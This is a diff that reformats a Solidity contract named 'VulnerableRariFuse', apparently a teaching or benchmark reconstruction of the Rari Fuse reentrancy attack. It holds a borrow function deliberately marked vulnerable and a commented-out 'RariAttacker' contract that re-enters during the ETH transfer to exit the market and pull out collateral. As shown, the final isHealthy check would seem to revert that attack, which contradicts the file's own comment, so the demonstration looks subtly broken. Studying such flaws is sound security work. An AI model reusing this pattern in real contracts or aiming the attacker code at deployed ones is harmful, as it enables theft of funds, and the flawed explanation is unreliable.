@@ -26,18 +26,24 @@ pragma solidity ^0.8.0;
  */
 
 interface IComptroller {
-    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
+    function enterMarkets(
+        address[] memory cTokens
+    ) external returns (uint256[] memory);
+
     function exitMarket(address cToken) external returns (uint256);
-    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
+
+    function getAccountLiquidity(
+        address account
+    ) external view returns (uint256, uint256, uint256);
 }
 
 contract VulnerableRariFuse {
     IComptroller public comptroller;
-    
+
     mapping(address => uint256) public deposits;
     mapping(address => uint256) public borrowed;
     mapping(address => bool) public inMarket;
-    
+
     uint256 public totalDeposits;
     uint256 public totalBorrowed;
     uint256 public constant COLLATERAL_FACTOR = 150; // 150% collateralization
@@ -58,13 +64,16 @@ contract VulnerableRariFuse {
     /**
      * @notice Check if account has sufficient collateral
      */
-    function isHealthy(address account, uint256 additionalBorrow) public view returns (bool) {
+    function isHealthy(
+        address account,
+        uint256 additionalBorrow
+    ) public view returns (bool) {
         uint256 totalDebt = borrowed[account] + additionalBorrow;
         if (totalDebt == 0) return true;
-        
+
         // Only count deposits if user is in market
         if (!inMarket[account]) return false;
-        
+
         uint256 collateralValue = deposits[account];
         return collateralValue >= (totalDebt * COLLATERAL_FACTOR) / 100;
     }
@@ -89,18 +98,18 @@ contract VulnerableRariFuse {
     function borrow(uint256 amount) external {
         require(amount > 0, "Invalid amount");
         require(address(this).balance >= amount, "Insufficient funds");
-        
+
         // Initial health check
         require(isHealthy(msg.sender, amount), "Insufficient collateral");
-        
+
         // Update state
         borrowed[msg.sender] += amount;
         totalBorrowed += amount;
-        
+
         // VULNERABLE: Send ETH before final validation
         (bool success, ) = payable(msg.sender).call{value: amount}("");
         require(success, "Transfer failed");
-        
+
         // This check happens too late - attacker already exited market
         require(isHealthy(msg.sender, 0), "Health check failed");
     }
@@ -122,10 +131,10 @@ contract VulnerableRariFuse {
     function withdraw(uint256 amount) external {
         require(deposits[msg.sender] >= amount, "Insufficient deposits");
         require(!inMarket[msg.sender], "Exit market first");
-        
+
         deposits[msg.sender] -= amount;
         totalDeposits -= amount;
-        
+
         payable(msg.sender).transfer(amount);
     }
 
@@ -138,24 +147,24 @@ contract VulnerableRariFuse {
  * contract RariAttacker {
  *     VulnerableRariFuse public fuse;
  *     bool public attacking = false;
- *     
+ *
  *     constructor(address _fuse) {
  *         fuse = VulnerableRariFuse(_fuse);
  *     }
- *     
+ *
  *     function attack() external payable {
  *         fuse.depositAndEnterMarket{value: msg.value}();
  *         attacking = true;
  *         fuse.borrow(msg.value * 2);  // Borrow 2x collateral
  *     }
- *     
+ *
  *     receive() external payable {
  *         if (attacking) {
  *             attacking = false;
  *             fuse.exitMarket();  // Exit market during borrow callback!
  *         }
  *     }
- *     
+ *
  *     function withdrawCollateral() external {
  *         fuse.withdraw(address(this).balance);
  *     }
